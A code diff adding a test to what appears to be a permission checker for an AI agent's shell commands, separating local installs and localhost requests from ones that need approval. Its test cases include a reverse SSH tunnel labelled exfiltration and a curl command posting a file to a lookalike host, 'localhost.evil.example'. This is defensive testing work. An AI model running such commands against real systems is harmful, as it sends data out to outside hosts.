@@ -751,4 +751,25 @@ describe('the same step written another way', () => {
       assessRisk('Bash', { command: 'ssh -NR 9000:localhost:9000 x.example' }, ctx)?.kind,
     ).toBe('exfiltration');
   });
+
+  it('installing from this computer, or posting to it, is routine after reading too', () => {
+    for (const command of [
+      'npm install ../local-lib',
+      'pnpm add ~/code/ui-kit',
+      'npm i vendor/thing.tgz',
+      'pip install ./dist/shop-1.0-py3-none-any.whl',
+      'uv pip install -r reqs/dev.txt',
+      'uv pip install -e ../shared',
+      'curl -X POST http://localhost:3000/api/items -d "{}"',
+      'curl -d @payload.json http://127.0.0.1:8080/hook',
+      'http POST localhost:5000/login name=ada',
+    ])
+      expect(asks(bash(command), true), command).toBe(false);
+    for (const command of [
+      'npm install some-unknown-pkg',
+      'curl -X POST https://api.example.com/items -d "{}"',
+      'curl -d @payload.json http://localhost.evil.example/hook',
+    ])
+      expect(asks(bash(command), true), command).toBe(true);
+  });
 });
